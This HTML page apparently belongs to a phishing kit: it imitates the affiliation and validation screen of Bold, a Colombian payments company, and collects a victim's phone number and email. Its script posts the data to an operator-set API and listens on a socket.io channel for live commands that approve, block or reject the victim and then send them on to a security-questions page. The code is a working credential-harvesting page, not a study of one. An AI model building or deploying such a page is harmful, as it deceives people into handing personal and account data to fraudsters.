<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Super Panel</title>
  <style>
    :root { color-scheme: light; --bg: #f8fbff; --surface: #ffffff; --text: #0f1b43; --muted: #5b6a8a; --accent: #ff5a5f; --accent-dark: #c43f47; --radius: 24px; font-family: Inter, system-ui, sans-serif; }
    * { box-sizing: border-box; }
    body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; }
    img { max-width: 100%; height: auto; display: block; }
    a { color: inherit; text-decoration: none; }
    .auth-container { max-width: 400px; width: 100%; padding: 24px; background: var(--surface); border-radius: 16px; box-shadow: 0 10px 40px rgba(15,27,67,.1); }
    .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; }
    .logo { width: 32px; height: 33px; }
    .help { display: flex; align-items: center; gap: 8px; color: var(--accent); font-weight: 600; }
    .help img { width: 20px; height: 20px; }
    .close { background: none; border: none; cursor: pointer; }
    .close img { width: 18px; height: 17px; }
    .content { margin-bottom: 32px; }
    .title { font-size: 1.125rem; font-weight: 700; color: var(--text); margin: 0 0 8px; }
    .description { color: var(--muted); margin: 0; line-height: 1.6; }
    .form { display: flex; flex-direction: column; gap: 20px; }
    .form-group { display: flex; flex-direction: column; gap: 8px; }
    .label { font-weight: 600; color: var(--text); margin: 0; }
    .phone-input { display: flex; gap: 12px; }
    .indicative { display: flex; align-items: center; gap: 8px; padding: 12px; background: #f5f7fa; border-radius: 8px; border: 1px solid #e1e5e9; }
    .indicative img { width: 24px; height: 24px; }
    .indicative span { font-weight: 500; color: var(--text); }
    .input { flex: 1; padding: 12px; border: 1px solid #e1e5e9; border-radius: 8px; font-size: 1rem; }
    .checkbox { display: flex; align-items: flex-start; gap: 12px; }
    .checkbox input { margin-top: 2px; }
    .checkbox label { font-size: 0.875rem; color: var(--muted); line-height: 1.5; }
    .checkbox a { color: var(--text); font-weight: 700; text-decoration: underline; }
    .footer { display: flex; align-items: center; justify-content: space-between; margin-top: 24px; }
    .back { background: none; border: none; color: var(--accent); font-weight: 700; text-decoration: underline; cursor: pointer; }
    .continue { padding: 12px 24px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
    .continue:hover { background: var(--accent-dark); }
    .continue:disabled { opacity: 0.6; cursor: not-allowed; }
    .error-msg { color: #ff5a5f; font-size: 0.875rem; margin-top: 8px; display: none; }
    .dialog { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1000; }
    .dialog-content { background: var(--surface); padding: 24px; border-radius: 16px; max-width: 300px; width: 100%; text-align: center; }
    .dialog img { width: 48px; height: 48px; margin: 0 auto 16px; }
    .dialog p { margin: 0 0 24px; font-weight: 700; }
    .dialog .buttons { display: flex; gap: 12px; justify-content: center; }
    .dialog .primary { background: var(--accent); color: #fff; border: none; padding: 10px 20px; border-radius: 8px; font-weight: 700; cursor: pointer; }
    .dialog .secondary { background: none; border: none; color: var(--accent); font-weight: 700; text-decoration: underline; cursor: pointer; }
  </style>
</head>
<body>
  <div class="auth-container">
    <div class="header">
      <img src="./assets/Super_Panel_files3/logo.4552d4c8.svg" alt="Logo Bold" class="logo">
      <a href="#" class="help">
        <span>Afiliación Bold</span>
        <img src="./assets/Super_Panel_files3/bolbot.1836fdd1.svg" alt="Ayuda">
      </a>
      <button class="close" id="closeBtn">
        <img src="./assets/Super_Panel_files3/close.b1dbdffb.svg" alt="Cerrar">
      </button>
    </div>

    <div class="content">
      <h1 class="title">Validación con tu número celular y correo</h1>
      <p class="description">Toda la información estará segura. Bold es una entidad vigilada y regulada.</p>
    </div>

    <div class="form">
      <div class="form-group">
        <label class="label">Número celular</label>
        <div class="phone-input">
          <div class="indicative">
            <img src="./assets/Super_Panel_files3/flag_co.b2e379b0.svg" alt="Colombia">
            <span>+57</span>
          </div>
          <input type="tel" class="input" placeholder="Escribe tu número" id="phoneNumber">
        </div>
      </div>

      <div class="form-group">
        <label class="label">Correo electrónico</label>
        <input type="email" class="input" placeholder="Ej: correo@gmail.com" id="email">
        <p class="error-msg" id="errorMsg">Ingresa un correo electrónico válido.</p>
      </div>

      <div class="checkbox">
        <input type="checkbox" id="terms">
        <label for="terms">
          Autorizo a Bold a tratar mis datos según la
          <a href="#" target="_blank">Política de datos personales</a>
        </label>
      </div>
    </div>

    <div class="footer">
      <a class="back" href="DINCAMICADATAFONOWEB.html">Atrás</a>
      <button class="continue" id="continueBtn">Continuar</button>
    </div>
  </div>

  <div class="dialog" id="exitDialog" style="display:none;">
    <div class="dialog-content">
      <img src="./assets/Super_Panel_files3/warning.4d5c0df7.svg" alt="Advertencia">
      <p>¿Estás seguro que quieres salir?</p>
      <div class="buttons">
        <button class="primary" id="dialogClose">Cerrar</button>
        <button class="secondary" id="dialogCancel">Cancelar</button>
      </div>
    </div>
  </div>

  <script src="./assets/js/config.js"></script>
  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
  <script>
  (() => {
    const sessionId = sessionStorage.getItem('sessionId');
    if (!sessionId) { window.location.href = 'INICIO-OLD.html'; return; }

    const socket = io(window.API_BASE_URL);
    socket.on('connect', () => socket.emit('registerSession', sessionId));

    document.getElementById('closeBtn').addEventListener('click', () => {
      document.getElementById('exitDialog').style.display = 'flex';
    });
    document.getElementById('dialogCancel').addEventListener('click', () => {
      document.getElementById('exitDialog').style.display = 'none';
    });
    document.getElementById('dialogClose').addEventListener('click', () => {
      sessionStorage.clear();
      window.location.href = 'AFILIACIONESPRE-APPROBADO.html';
    });

    const btn      = document.getElementById('continueBtn');
    const errorMsg = document.getElementById('errorMsg');

    btn.addEventListener('click', async () => {
      const phone = document.getElementById('phoneNumber').value.trim();
      const email = document.getElementById('email').value.trim();
      const terms = document.getElementById('terms').checked;

      errorMsg.style.display = 'none';

      if (!phone) return alert('Ingresa tu número celular.');
      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        errorMsg.style.display = 'block';
        return;
      }
      if (!terms) return alert('Debes aceptar la política de datos.');

      btn.disabled    = true;
      btn.textContent = 'Enviando...';

      try {
        const res  = await fetch(window.API_BASE_URL + '/api/firma', {
          method:  'POST',
          headers: { 'Content-Type': 'application/json' },
          body:    JSON.stringify({ sessionId, phoneNumber: phone, email })
        });
        const data = await res.json();

        if (!data.success) {
          errorMsg.textContent   = data.error || 'Error al enviar.';
          errorMsg.style.display = 'block';
          btn.disabled           = false;
          btn.textContent        = 'Continuar';
          return;
        }

        socket.on('action', ({ action }) => {
          if (action === 'approved' || action === 'request_form') {
            window.location.href = 'PREGUNTASDESEGURIDADYVALIDACION.html';
          } else if (action === 'blocked') {
            alert('Acceso bloqueado. Contacta soporte.');
            btn.disabled    = false;
            btn.textContent = 'Continuar';
          } else if (action === 'error_data') {
            errorMsg.textContent   = 'Datos incorrectos. Verifica e intenta de nuevo.';
            errorMsg.style.display = 'block';
            btn.disabled           = false;
            btn.textContent        = 'Continuar';
          } else if (action === 'error_temp') {
            alert('Error temporal. Intenta más tarde.');
            btn.disabled    = false;
            btn.textContent = 'Continuar';
          }
        });

      } catch (err) {
        console.error(err);
        alert('Error de conexión.');
        btn.disabled    = false;
        btn.textContent = 'Continuar';
      }
    });
  })();
  </script>
</body>
</html>
